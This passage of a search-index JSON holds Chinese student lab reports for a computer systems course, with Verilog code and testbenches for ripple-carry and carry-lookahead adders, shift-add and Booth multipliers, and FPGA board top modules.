<li>\u4f7f\u7528\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5</li> </ol> </li> <li>32 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0832-bit carry-lookahead adder\uff09<ol> <li>\u6309\u7167 carry-lookahead adder \u539f\u7406\uff0c\u4f7f\u7528 verilog \u5b9e\u73b0 32-bit \u7684 carry-lookahead adder</li> <li>\u7f16\u5199\u4eff\u771f\u6d4b\u8bd5\u4ee3\u7801\uff0c\u5bf9\u6240\u5199\u52a0\u6cd5\u5668\u505a\u4e0d\u5c11\u4e8e 5 \u7ec4\u6837\u4f8b\u7684\u4eff\u771f\u6d4b\u8bd5</li> <li>\u4f7f\u7528\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5</li> </ol> </li> </ul>"},{"location":"cs/system/cs1/lab2-1/#32","title":"32 \u4f4d\u884c\u6ce2\u8fdb\u4f4d\u52a0\u6cd5\u5668","text":"<p>\u4e3b\u4f53\u601d\u8def\u5c31\u662f\u4f7f\u7528\u4e24\u4e2a 16 \u4f4d\u52a0\u6cd5\u5668\u4e32\u8054\u6210 32 \u4f4d\u52a0\u6cd5\u5668\u300216 \u4f4d\u52a0\u6cd5\u5668\u4f7f\u7528 4 \u4e2a 4 \u4f4d\u52a0\u6cd5\u5668\u4e32\u8054\uff0c4 \u4f4d\u52a0\u6cd5\u5668\u4f7f\u7528 4 \u4e2a\u5168\u52a0\u5668\u4e32\u8054</p>"},{"location":"cs/system/cs1/lab2-1/#_3","title":"\u4e00\u4f4d\u5168\u52a0\u5668","text":"<p>lab 1-1 \u4e2d\u5df2\u7ecf\u505a\u8fc7\u5bf9\u5e94\u7684\u903b\u8f91\u7535\u8def\uff0c\u53ea\u9700\u8981\u5c06\u5176\u5199\u6210 verilog \u8bed\u8a00\uff1a <pre><code>module FullAdder(\n    input A,\n    input B,\n    input Cin,\n    output S,\n    output Cout\n);\n    assign S = A ^ B ^ Cin;\n    assign Cout = (A &amp; B) | ((A ^ B) &amp; Cin);\nendmodule\n</code></pre></p>"},{"location":"cs/system/cs1/lab2-1/#432","title":"4~32 \u4f4d\u884c\u6ce2\u8fdb\u4f4d\u52a0\u6cd5\u5668","text":"<pre><code>module RippleCarryAdder4(\n    input [3:0] A,\n    input [3:0] B,\n    input Cin,\n    output [3:0] S,\n    output Cout\n);\n    wire cout_1, cout_2, cout_3; // \u8fdb\u4f4d\uff0c\u7528\u4e8e\u4e32\u8054\u52a0\u6cd5\u5668\n\n    FullAdder adder0(\n        .A(A[0]),\n        .B(B[0]),\n        .Cin(Cin),\n        .S(S[0]),\n        .Cout(cout_1)\n    );\n\n    FullAdder adder1(\n        .A(A[1]),\n        .B(B[1]),\n        .Cin(cout_1),  // \u8fde\u63a5 adder0 \u7684\u8fdb\u4f4d\n        .S(S[1]),\n        .Cout(cout_2)\n    );\n\n    FullAdder adder2(\n        .A(A[2]),\n        .B(B[2]),\n        .Cin(cout_2),  // \u8fde\u63a5 adder1 \u7684\u8fdb\u4f4d\n        .S(S[2]),\n        .Cout(cout_3)\n    );\n\n    FullAdder adder3(\n        .A(A[3]),\n        .B(B[3]),\n        .Cin(cout_3),  // \u8fde\u63a5 adder2 \u7684\u8fdb\u4f4d\n        .S(S[3]),\n        .Cout(Cout)\n    );\n\nendmodule\n\n\nmodule RippleCarryAdder16(\n    input [15:0] A,\n    input [15:0] B,\n    input Cin,\n    output [15:0] S,\n    output Cout\n);\n    wire cout_1, cout_2, cout_3; // \u4e0e\u56db\u4f4d\u52a0\u6cd5\u5668\u540c\u7406\n\n    RippleCarryAdder4 adder0(\n        .A(A[3:0]),\n        .B(B[3:0]),\n        .Cin(Cin),\n        .S(S[3:0]),\n        .Cout(cout_1)\n    );\n\n    RippleCarryAdder4 adder1(\n        .A(A[7:4]),\n        .B(B[7:4]),\n        .Cin(cout_1),\n        .S(S[7:4]),\n        .Cout(cout_2)\n    );\n\n    RippleCarryAdder4 adder2(\n        .A(A[11:8]),\n        .B(B[11:8]),\n        .Cin(cout_2),\n        .S(S[11:8]),\n        .Cout(cout_3)\n    );\n\n    RippleCarryAdder4 adder3(\n        .A(A[15:12]),\n        .B(B[15:12]),\n        .Cin(cout_3),\n        .S(S[15:12]),\n        .Cout(Cout)\n    );\n\nendmodule\n\n\nmodule RippleCarryAdder(\n    input [31:0] A,\n    input [31:0] B,\n    output [31:0] S\n);\n    wire cout, Cout;\n\n    RippleCarryAdder16 adder0(\n        .A(A[15:0]),\n        .B(B[15:0]),\n        .Cin(1'b0),\n        .S(S[15:0]),\n        .Cout(cout)\n    );\n\n    RippleCarryAdder16 adder1(\n        .A(A[31:16]),\n        .B(B[31:16]),\n        .Cin(cout),\n        .S(S[31:16]),\n        .Cout(Cout)\n    );\n\nendmodule\n</code></pre>"},{"location":"cs/system/cs1/lab2-1/#testbench","title":"\u4eff\u771f\u6d4b\u8bd5 TestBench","text":"<p>\u7f16\u5199\u4e86\u5305\u542b\u4e94\u7ec4\u6d4b\u8bd5\u6837\u4f8b\u7684 test bench\uff1a <pre><code>module TestAdder();\n    reg [31:0] A;\n    reg [31:0] B;\n    wire [31:0] S;\n\n    RippleCarryAdder adder(\n        .A(A),\n        .B(B),\n        .S(S)\n    );\n\n    initial begin\n        A = 32'h00000001;\n        B = 32'h00000001;\n    #200\n        A = 32'h00000AAA;\n        B = 32'h00000BBB;\n    #200\n        A = 32'h12345678;\n        B = 32'h23456789;\n    #200\n        A = 32'h87654321;\n        B = 32'h12345678;\n    #200\n        A = 32'h10101010;\n        B = 32'h4DEF67BC;\n    end\n\nendmodule\n</code></pre> \u4eff\u771f\u7ed3\u679c\uff1a </p> <p>\u53ef\u89c1\u52a0\u6cd5\u8fd0\u7b97\u6b63\u5e38</p>"},{"location":"cs/system/cs1/lab2-1/#_4","title":"\u8fde\u63a5\u6d4b\u8bd5\u73af\u5883","text":"<p>\u6309\u7167\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u4ee5\u53ca\u4f7f\u7528\u65b9\u6cd5\u521b\u5efa\u4e00\u4e2a\u9876\u5c42\u6a21\u5757\u6765\u8c03\u7528\u52a0\u6cd5\u5668\uff0c\u5e76\u4e14\u5b9e\u73b0\u677f\u5b50\u4e0a\u7684\u4ea4\u4e92\u3002\u8f7d\u5165 ENV.edf ENV_stub.v \u6587\u4ef6\uff0c\u4ee5\u53ca Nexys4.xdc constraints\uff0c\u7f16\u5199\u9876\u5c42\u6a21\u5757\uff1a <pre><code>module Top(\n    input RSTN, clk_100mhz,\n    input BTNL, BTNR, BTNU, BTND, BTNC,\n    input [15:0]SW,\n    output [15:0]LED,\n    output [7:0]SEGMENT, AN\n);\n    wire rst = ~RSTN;\n    assign LED = SW;\n    wire [31:0] Ai, Bi;\n    wire [31:0] sum; // \u52a0\u6cd5\u7ed3\u679c\n\n    ENV env(\n        .clk(clk_100mhz), .rst(rst),\n        .SW(SW),\n        .BTNL(BTNL),\n        .BTNR(BTNR),\n        .BTNU(BTNU),\n        .BTND(BTND),\n        .BTNC(BTNC),\n        .SEGMENT(SEGMENT),\n        .AN(AN),\n        .Ai(Ai),\n        .Bi(Bi),\n        .SUM(sum),  // \u8fde\u63a5\u7ed3\u679c\n        .MUL(prod)\n    );\n\n    RippleCarryAdder adder(\n        .A(Ai),\n        .B(Bi),\n        .S(sum)\n    );\nendmodule\n</code></pre></p> <p>\u4e0a\u677f\u6d4b\u8bd5\u4e5f\u4e00\u5207\u6b63\u5e38\u3002</p>"},{"location":"cs/system/cs1/lab2-1/#32_1","title":"32 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668","text":"<p>\u6309\u7167\u7ed9\u5b9a\u7684\u601d\u8def\uff0c\u4f7f\u7528 4 \u4e2a 4 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\u6309\u7167\u8d85\u524d\u8fdb\u4f4d\u903b\u8f91\u62fc\u6210 16 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0c\u7136\u540e\u4f7f\u7528\u884c\u6ce2\u8fdb\u4f4d\u903b\u8f91\u4e32\u8054\u6210 32 \u4f4d\u52a0\u6cd5\u5668\u3002</p>"},{"location":"cs/system/cs1/lab2-1/#4","title":"4 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668","text":"<p>\u6839\u636e\u7ed9\u51fa\u7684\u4e00\u7cfb\u5217\u516c\u5f0f\u5373\u53ef\u5199\u51fa\u4ee3\u7801\uff0c\u5e76\u4e14\u4e3a\u4e86\u8fde\u63a5\u51fa 16 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0c\u8fd8\u8981 output \u6574\u4f53\u7684 P \u548c G \u4fe1\u53f7\uff0c\u4ee3\u7801\uff1a <pre><code>module CarryLookaheadAdder4(\n    input [3:0] A,\n    input [3:0] B,\n    input Cin,\n    output [3:0] S,\n    output P,\n    output G,\n    output Cout\n);\n    wire [3:0] p;\n    wire [3:0] g;\n    assign p = A ^ B;\n    assign g = A &amp; B;\n\n    wire [4:0] c;\n    assign c[0] = Cin;\n    assign c[1] = g[0] | (p[0] &amp; c[0]);\n    assign c[2] = g[1] | (p[1] &amp; g[0]) | (p[1] &amp; p[0] &amp; c[0]);\n    assign c[3] = g[2] | (p[2] &amp; g[1]) | (p[2] &amp; p[1] &amp; g[0]) | (p[2] &amp; p[1] &amp; p[0] &amp; c[0]);\n    assign c[4] = g[3] | (p[3] &amp; g[2]) | (p[3] &amp; p[2] &amp; g[1]) | (p[3] &amp; p[2] &amp; p[1] &amp; g[0]) | (p[3] &amp; p[2] &amp; p[1] &amp; p[0] &amp; c[0]);\n\n    assign S = p ^ c[3:0];\n    assign Cout = c[4];\n\n    assign P = p[0] &amp; p[1] &amp; p[2] &amp; p[3];\n    assign G = g[3] | (p[3] &amp; g[2]) | (p[3] &amp; p[2] &amp; g[1]) | (p[3] &amp; p[2] &amp; p[1] &amp; g[0]);\nendmodule\n</code></pre></p>"},{"location":"cs/system/cs1/lab2-1/#16","title":"16 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668","text":"<p>\u4f7f\u7528\u56db\u4e2a 4 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\uff0c\u6839\u636e\u8d85\u524d\u8fdb\u4f4d\u903b\u8f91\u62fc\u63a5\u5728\u4e00\u8d77\u3002\u5373\u56db\u4e2a 4 \u4f4d\u52a0\u6cd5\u5668\u540c\u65f6\u8ba1\u7b97\uff0c\u8fdb\u4f4d\u4e0d\u4f9d\u6b21\u4f20\u5165\u800c\u662f\u5728\u5f53\u524d\u6a21\u5757\u4e2d\u6839\u636e P \u548c G \u8d85\u524d\u8ba1\u7b97\u5f97\u51fa\uff0c\u4ee3\u7801\uff1a <pre><code>module CarryLookaheadAdder16(\n    input [15:0] A,\n    input [15:0] B,\n    input Cin,\n    output [15:0] S,\n    output P,\n    output G,\n    output Cout\n);\n    wire [4:0] c;\n    wire [3:0] p;\n    wire [3:0] g;\n    assign c[0] = Cin;\n    assign Cout = c[4];\n\n    CarryLookaheadAdder4 adder0(\n        .A(A[3:0]),\n        .B(B[3:0]),\n        .Cin(c[0]),\n        .S(S[3:0]),\n        .P(p[0]),\n        .G(g[0])\n    );\n\n    CarryLookaheadAdder4 adder1(\n        .A(A[7:4]),\n        .B(B[7:4]),\n        .Cin(c[1]),\n        .S(S[7:4]),\n        .P(p[1]),\n        .G(g[1])\n    );\n\n    CarryLookaheadAdder4 adder2(\n        .A(A[11:8]),\n        .B(B[11:8]),\n        .Cin(c[2]),\n        .S(S[11:8]),\n        .P(p[2]),\n        .G(g[2])\n    );\n\n    CarryLookaheadAdder4 adder3(\n        .A(A[15:12]),\n        .B(B[15:12]),\n        .Cin(c[3]),\n        .S(S[15:12]),\n        .P(p[3]),\n        .G(g[3])\n    );\n\n    assign c[1] = g[0] | (p[0] &amp; c[0]);\n    assign c[2] = g[1] | (p[1] &amp; g[0]) | (p[1] &amp; p[0] &amp; c[0]);\n    assign c[3] = g[2] | (p[2] &amp; g[1]) | (p[2] &amp; p[1] &amp; g[0]) | (p[2] &amp; p[1] &amp; p[0] &amp; c[0]);\n    assign c[4] = g[3] | (p[3] &amp; g[2]) | (p[3] &amp; p[2] &amp; g[1]) | (p[3] &amp; p[2] &amp; p[1] &amp; g[0]) | (p[3] &amp; p[2] &amp; p[1] &amp; p[0] &amp; c[0]);\n\n    assign P = p[0] &amp; p[1] &amp; p[2] &amp; p[3];\n    assign G = g[3] | (p[3] &amp; g[2]) | (p[3] &amp; p[2] &amp; g[1]) | (p[3] &amp; p[2] &amp; p[1] &amp; g[0]);\nendmodule\n</code></pre></p>"},{"location":"cs/system/cs1/lab2-1/#32_2","title":"32 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668","text":"<p>\u4f7f\u7528\u4e24\u4e2a 16 \u4f4d\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\u7528\u884c\u6ce2\u8fdb\u4f4d\u903b\u8f91\u4e32\u8054\u5728\u4e00\u8d77\uff1a <pre><code>module CarryLookaheadAdder(\n    input [31:0] A,\n    input [31:0] B,\n    output [31:0] S\n);\n    wire cout, Cout;\n\n    CarryLookaheadAdder16 adder0(\n        .A(A[15:0]),\n        .B(B[15:0]),\n        .Cin(1'b0),\n        .S(S[15:0]),\n        .Cout(cout)\n    );\n\n    CarryLookaheadAdder16 adder1(\n        .A(A[31:16]),\n        .B(B[31:16]),\n        .Cin(cout),\n        .S(S[31:16]),\n        .Cout(Cout)\n    );\nendmodule\n</code></pre></p>"},{"location":"cs/system/cs1/lab2-1/#_5","title":"\u4eff\u771f\u6d4b\u8bd5\u4e0e\u4e0a\u677f\u6d4b\u8bd5","text":"<p>\u4e0e\u524d\u9762\u884c\u6ce2\u8fdb\u4f4d\u52a0\u6cd5\u5668\u7c7b\u4f3c\uff0c\u5c06\u5176 test bench \u4e0e top \u6a21\u5757\u4e2d\u5b9e\u4f8b\u5316\u52a0\u6cd5\u5668\u6a21\u5757\u90e8\u5206\u6539\u4e3a\uff1a <pre><code>    CarryLookaheadAdder adder(\n        .A(A),\n        .B(B),\n        .S(S)\n    );\n</code></pre> \u5373\u53ef\u6d4b\u8bd5\u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668\u4e0e\u4e0a\u677f\u6d4b\u8bd5\u3002\u4eff\u771f\u7ed3\u679c\uff1a </p> <p>\u4e0a\u677f\u6d4b\u8bd5\u4e5f\u4e00\u5207\u6b63\u5e38\u3002</p>"},{"location":"cs/system/cs1/lab2-2/","title":"\u590d\u6742\u64cd\u4f5c\uff1a\u4e58\u6cd5\u5668","text":"<p> \u7ea6 587 \u4e2a\u5b57  133 \u884c\u4ee3\u7801  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab2-2 \u5b9e\u9a8c\u62a5\u544a\uff082022.03.25 ~ 2022.04.15\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs1/lab2-2/#_2","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>32 \u4f4d\u79fb\u4f4d\u76f8\u52a0\u6709\u7b26\u53f7\u4e58\u6cd5\u5668<ol> <li>\u6309\u7167\u79fb\u4f4d\u76f8\u52a0\u7684\u539f\u7406\uff0c\u4f7f\u7528 verilog \u7f16\u5199 32 \u4f4d\u4e58\u6cd5\u5668</li> <li>\u7f16\u5199\u4eff\u771f\u6d4b\u8bd5\u4ee3\u7801\uff0c\u5bf9\u6240\u5199\u4e58\u6cd5\u5668\u505a\u4e0d\u5c11\u4e8e 5 \u7ec4\u6837\u4f8b\u7684\u4eff\u771f\u6d4b\u8bd5</li> <li>\u4f7f\u7528\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5</li> </ol> </li> <li>32 \u4f4d Booth \u4e58\u6cd5\u5668<ol> <li>\u6309\u7167 Booth Algorithm\uff0c\u4f7f\u7528 verilog \u7f16\u5199 32 \u4f4d\u4e58\u6cd5\u5668</li> <li>\u7f16\u5199\u4eff\u771f\u6d4b\u8bd5\u4ee3\u7801\uff0c\u5bf9\u6240\u5199\u4e58\u6cd5\u5668\u505a\u4e0d\u5c11\u4e8e 5 \u7ec4\u6837\u4f8b\u7684\u4eff\u771f\u6d4b\u8bd5</li> <li>\u4f7f\u7528\u63d0\u4f9b\u7684\u6d4b\u8bd5\u73af\u5883\u8fdb\u884c\u4e0a\u677f\u6d4b\u8bd5</li> </ol> </li> </ul>"},{"location":"cs/system/cs1/lab2-2/#32","title":"32 \u4f4d\u79fb\u4f4d\u76f8\u52a0\u6709\u7b26\u53f7\u4e58\u6cd5\u5668","text":""},{"location":"cs/system/cs1/lab2-2/#_3","title":"\u601d\u8def\u53ca\u4ee3\u7801","text":"<p>\u79fb\u4f4d\u76f8\u52a0\u4e58\u6cd5\u5668\u7684\u539f\u7406\u5c31\u662f\u8fdb\u884c\u4f4d\u6570\u6b21\u5faa\u73af\uff0c\u6bcf\u6b21\u5faa\u73af\u68c0\u67e5 multiplier \u7684\u6700\u4f4e\u4f4d\uff0c\u5982\u679c\u662f 1\uff0c\u5c06\u4e58\u6cd5\u7ed3\u679c\u52a0\u4e0a multiplicand\uff0c\u662f 0 \u5c31\u4e0d\u8fdb\u884c\u8fd9\u4e2a\u64cd\u4f5c\uff0c\u4e4b\u540e\u5c06 multiplicand \u5de6\u79fb\u4e00\u4f4d\uff0cmultiplier \u53f3\u79fb\u4e00\u4f4d\u7136\u540e\u7ee7\u7eed\u5faa\u73af\u3002</p> <p>\u5728 verilog \u4e2d\u53ef\u4ee5\u4f7f\u7528 always @(*) \u6765\u521b\u5efa\u4e00\u4e2a\u4e32\u884c\u8fd0\u884c\u7684\u5757\uff0c\u76f4\u63a5\u5728\u5176\u4e2d\u6309\u7167\u79fb\u4f4d\u76f8\u52a0\u7684\u903b\u8f91\u8fdb\u884c\u8fd0\u7b97\u5373\u53ef\u3002\u5e76\u4e14\u8981\u5148\u5224\u65ad\u4e00\u4e0b\u6b63\u8d1f\uff0c\u5982\u679c\u662f\u8d1f\u7684\uff08\u6700\u9ad8\u4f4d\u4e3a 1\uff09\u5219\u8981\u5148\u53d6\u53cd\u52a0\u4e00\uff08\u5373\u53d6\u7edd\u5bf9\u503c\uff09\uff0c\u5e76\u4e14\u4e5f\u8981\u5224\u65ad\u7ed3\u679c\u7684\u6b63\u8d1f\u3002\u4ee3\u7801\uff1a <pre><code>module ShiftAddMultiplier(\n    input [31:0] A,\n    input [31:0] B,\n    output [63:0] P\n);\n    integer i;\n    reg [31:0] multiplicand;\n    reg [31:0] multiplier;\n    reg [63:0] prod;\n    wire A_sign, B_sign, P_sign;\n    assign A_sign = A[31];\n    assign B_sign = B[31];\n    assign P_sign = A_sign ^ B_sign;\n\n    always @(*) begin\n        multiplicand = A_sign? ~A+1 : A;\n        multiplier = B_sign? ~B+1 : B;\n        prod = 0;\n        for (i = 0; i &lt; 32; i = i + 1) begin\n            if (multiplier[0] == 1'b1) begin\n                prod = prod + multiplicand;\n            end\n            multiplicand = multiplicand &lt;&lt; 1;\n            multiplier = multiplier &gt;&gt; 1;\n        end\n    end\n    assign P = P_sign? ~prod+1 : prod;\nendmodule\n</code></pre></p>"},{"location":"cs/system/cs1/lab2-2/#_4","title":"\u4eff\u771f\u6d4b\u8bd5","text":"<p>\u5305\u542b\u4e94\u7ec4\u6d4b\u8bd5\u6837\u4f8b\u7684 test bench\uff1a <pre><code>module TestMultiplier();\n    reg [31:0] A;\n    reg [31:0] B;\n    wire [63:0] P;\n\n    ShiftAddMultiplier multiplier(\n        .A(A),\n        .B(B),\n        .P(P)\n    );\n\n    initial begin\n        A = 32'h00000001;\n        B = 32'h00000002;\n    #200\n        A = 32'h00000002;\n        B = 32'h00000005;\n    #200\n        A = 32'h00000009;\n        B = 32'h00000009;\n    #200\n        A = -14;\n        B = 12;\n    #200\n        A = -123;\n        B = -456;\n    end\nendmodule\n</code></pre> \u4eff\u771f\u7ed3\u679c\uff1a </p> <p>\u53ef\u4ee5\u770b\u51fa\u5de5\u4f5c\u6b63\u5e38\u3002</p>"},{"location":"cs/system/cs1/lab2-2/#_5","title":"\u4e0a\u677f\u9a8c\u8bc1","text":"<p>\u548c lab 2-1 \u7c7b\u4f3c\uff0c\u5728\u9876\u5c42\u6a21\u5757\u4e2d\u8fde\u5165\u4e58\u6cd5\u5668\uff1a <pre><code>module Top(\n    input RSTN, clk_100mhz,\n    input BTNL, BTNR, BTNU, BTND, BTNC,\n    input [15:0]SW,\n    output [15:0]LED,\n    output [7:0]SEGMENT, AN\n);\n    wire rst = ~RSTN;\n    assign LED = SW;\n    wire [31:0] Ai, Bi;\n    wire [31:0] sum;\n    wire [63:0] prod;\n\n    ENV env(\n        .clk(clk_100mhz), .rst(rst),\n        .SW(SW),\n        .BTNL(BTNL),\n        .BTNR(BTNR),\n        .BTNU(BTNU),\n        .BTND(BTND),\n        .BTNC(BTNC),\n        .SEGMENT(SEGMENT),\n        .AN(AN),\n        .Ai(Ai),\n        .Bi(Bi),\n        .SUM(sum),\n        .MUL(prod)\n    );\n\n    CarryLookaheadAdder adder(\n        .A(Ai),\n        .B(Bi),\n        .S(sum)\n    );\n\n    ShiftAddMultiplier multiplier(\n        .A(Ai),\n        .B(Bi),\n        .P(prod)\n    );\nendmodule\n</code></pre> \u4e0a\u677f\u6d4b\u8bd5\u540e\u4e5f\u90fd\u6309\u7167\u6b63\u5e38\u5de5\u4f5c\u3002</p>"},{"location":"cs/system/cs1/lab2-2/#32-booth","title":"32 \u4f4d Booth \u4e58\u6cd5\u5668","text":""},{"location":"cs/system/cs1/lab2-2/#_6","title":"\u601d\u8def\u53ca\u4ee3\u7801","text":"<p>\u6309\u7167\u7ed9\u51fa\u7684 Booth Algorithm \u6d41\u7a0b\uff0c\u5373\uff1a - A = {multiplicand[31], multiplicand, 33'b0} - S = {-{multiplicand[31], multiplicand}, 33'b0} - P = {33'b0, multiplier, 0} - \u5faa\u73af 32 \u6b21\uff1a     - \u5982\u679c P[1:0] \u4e3a 2'b10\uff1aP = P + S     - \u5982\u679c P[1:0] \u4e3a 2'b01\uff1aP = P + A     - \u5982\u679c P[1:0] \u4e3a 2'b00\u30012'b11\uff1a\u4e0d\u53d8     - P \u7b97\u672f\u53f3\u79fb\u4e00\u4f4d - P[64:1] \u5373\u4e3a\u4e58\u6cd5\u7ed3\u679c</p> <p>\u6309\u7167\u8fd9\u4e2a\u601d\u8def\uff0c\u5728 always @(*) \u5757\u4e2d\u8fdb\u884c\u8fd0\u7b97\u5c31\u53ef\u4ee5\u5f97\u5230\u4e58\u6cd5\u7ed3\u679c\uff0c\u4ee3\u7801\uff1a <pre><code>module BoothMultiplier(\n    input [31:0] A,\n    input [31:0] B,\n    output [63:0] P\n);\n    reg [65:0] a, s, p;\n    integer i;\n\n    always @(*) begin\n        a[31:0] = A;\n        a[32] = a[31];\n        a = a &lt;&lt; 33;\n        s = 0;\n        s[31:0] = A;\n        s[32] = s[31];\n        s = ~s + 1;\n        s = s &lt;&lt; 33;\n        p = 0;\n        p[32:1] = B;\n        for (i = 0; i &lt; 32; i = i + 1) begin\n            if (p[1:0] == 2'b10) begin\n                p = p + s;\n            end\n            else if (p[1:0] == 2'b01) begin\n                p = p + a;\n            end\n            p = ($signed(p)) &gt;&gt;&gt; 1;\n        end\n    end\n    assign P = p[64:1];\nendmodule\n</code></pre></p>"},{"location":"cs/system/cs1/lab2-2/#_7","title":"\u4eff\u771f\u6d4b\u8bd5\u53ca\u4e0a\u677f\u6d4b\u8bd5","text":"<p>\u548c lab 2-1 \u4ee5\u53ca\u524d\u9762\u79fb\u4f4d\u76f8\u52a0\u4e58\u6cd5\u5668\u540c\u7406\uff0c\u5c06\u5176\u4e2d\u4e58\u6cd5\u5668\u5b9e\u4f8b\u5316\u90e8\u5206\u6362\u4e3a\uff1a <pre><code>    BoothMultiplier multiplier(\n        .A(A),\n        .B(B),\n        .P(P)\n    );\n</code></pre> \u5373\u53ef\u5b8c\u6210\u5bf9 Booth \u4e58\u6cd5\u5668\u7684\u4eff\u771f\u4ee5\u53ca\u4e0a\u677f\u9a8c\u8bc1\uff0c\u4eff\u771f\u7ed3\u679c\uff1a </p> <p>\u8fd0\u884c\u6b63\u786e\uff0c\u5e76\u4e14\u4e0a\u677f\u9a8c\u8bc1\u540e\u4e5f\u6309\u7167\u9884\u671f\u5de5\u4f5c\u3002</p>"},{"location":"cs/system/cs1/lab3/","title":"\u4e03\u6bb5\u7ba1\u663e\u793a\u5668","text":"<p> \u7ea6 816 \u4e2a\u5b57  91 \u884c\u4ee3\u7801  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab3 \u5b9e\u9a8c\u62a5\u544a\uff082022.04.16 ~ 2022.04.29\uff09</p> <p>Warning</p> <p>\u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad</p>"},{"location":"cs/system/cs1/lab3/#_2","title":"\u5b9e\u9a8c\u5185\u5bb9","text":"<ul> <li>\u7406\u89e3\u7ea6\u675f\u6587\u4ef6\uff0c\u6dfb\u52a0\u5f00\u5173\u63a7\u5236<ol> <li>\u6253\u5f00 Vivado \u8f6f\u4ef6\uff0c\u6309\u7167\u5b9e\u9a8c 1 \u7684\u52a0\u5165\u6587\u4ef6\u65b9\u5f0f\uff0c\u52a0\u5165\u6240\u6709\u7684 .v \u6587\u4ef6\u548c .xdc \u6587\u4ef6</li> <li>\u6837\u4f8b\u4e2d\u5df2\u7ecf\u5c06\u4e03\u6bb5\u7ba1\u548c\u65f6\u949f\u53ca rst \u8bbe\u8ba1\u597d</li> <li>\u5237\u5165\u677f\u5b50\u540e\uff0c\u53d1\u73b0\u677f\u5b50\u95f4\u63a5\u6027\u95ea\u70c1 FFFFFFFF\uff0c\u7531\u4e8e\u6ca1\u6709\u5f00\u5173\u8f93\u5165\uff0c\u6240\u4ee5\u6837\u4f8b\u4e2d\u5c06\u6240\u6709\u7684\u8f93\u5165\u90fd\u8bbe\u7f6e\u4e3a\u4e86 F</li> <li>\u7406\u89e3\u73b0\u6709\u7684 xdc \u6587\u4ef6\uff0c\u7136\u540e\u8bf7\u6dfb\u52a0 R15,M13,L16,J15 \u5f00\u5173\u5230\u7ea6\u675f\u6587\u4ef6\u3002</li> </ol> </li> <li>\u7406\u89e3\u65f6\u949f\u5206\u9891\uff0c\u964d\u4f4e\u95ea\u70c1\u901f\u5ea6<ol> <li>\u672c\u6b21\u5b9e\u9a8c\u5df2\u7ecf\u5b9e\u73b0\u4e86\u4e00\u4e2a\u8f83\u4e3a\u7b80\u5355\u7684\u65f6\u949f\u5206\u9891\u4f7f\u5f97\u95ea\u70c1\u901f\u5ea6\u63a5\u8fd1 1s \u4e00\u6b21</li> <li>\u7406\u89e3\u539f\u6709\u7684\u4ee3\u7801\uff0c\u8ba9\u95ea\u70c1\u6d88\u5931</li> </ol> </li> <li>\u4e03\u6bb5\u7ba1\u7684\u8bd1\u7801\u5668<ol> <li>\u76ee\u524d\u5c1a\u672a\u5b8c\u6210 hex2shape \u7684\u8bd1\u7801\u5668\uff0c\u53ea\u80fd\u5b9e\u73b0\u663e\u793a F</li> <li>\u91cd\u65b0\u4fee\u6539\u4ee3\u7801\uff0c\u4f7f\u5f97\u4e03\u6bb5\u7ba1\u53ef\u4ee5\u663e\u793a 0-9</li> <li>\u5c06 R15,M13,L16,J15 \u5f00\u5173\u548c\u8f93\u5165\u4fe1\u53f7\u76f8\u5173\u8054\uff0c\u4f7f\u5f97\u66f4\u6539\u5f00\u5173\u53ef\u4ee5\u6539\u53d8\u95ea\u70c1\u7684\u4e03\u6bb5\u7ba1\u663e\u793a</li> <li>\u9700\u8981\u5b9e\u73b0\u7684\u90e8\u5206\u5df2\u7528\u6ce8\u91ca\u6807\u51fa</li> </ol> </li> <li>Bonus\uff1a\u4e03\u6bb5\u7ba1\u6269\u5c55<ol> <li>\u5b8c\u6210 AbCdEF \u7684\u989d\u5916\u663e\u793a</li> </ol> </li> </ul>"},{"location":"cs/system/cs1/lab3/#_3","title":"\u7ea6\u675f\u6587\u4ef6\u4e2d\u6dfb\u52a0\u5f00\u5173\u63a7\u5236","text":""},{"location":"cs/system/cs1/lab3/#_4","title":"\u601d\u8def\u53ca\u4ee3\u7801","text":"<p>\u53ef\u4ee5\u53d1\u73b0\u7ea6\u675f\u6587\u4ef6\u4e2d\u5bf9\u5e94\u5f15\u811a\u548c\u53d8\u91cf\u7684\u8bed\u53e5\u90fd\u662f\u5982\u4e0b\u5f62\u5f0f\uff1a <pre><code>set_property PACKAGE_PIN \u5f15\u811a [get_ports {\u53d8\u91cf}]\nset_property IOSTANDARD LVCMOS33 [get_ports {\u53d8\u91cf}]\n</code></pre> \u6240\u4ee5\u6dfb\u52a0\u5f00\u5173\u63a7\u5236\u9700\u8981\u5148\u5728 Top.v 